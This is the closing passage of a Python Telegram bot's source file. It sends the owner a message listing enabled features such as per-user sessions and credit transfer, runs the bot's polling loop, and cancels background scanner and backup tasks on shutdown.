            f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
            f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
            f"👤 <b>Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"owner notify: {e}")

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        scanner_task.cancel()
        if _BACKUP_TASK: _BACKUP_TASK.cancel()
        try: save_now(load())
        except Exception: pass
        await close_http()
        log.info("shutdown complete")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("interrupted by user")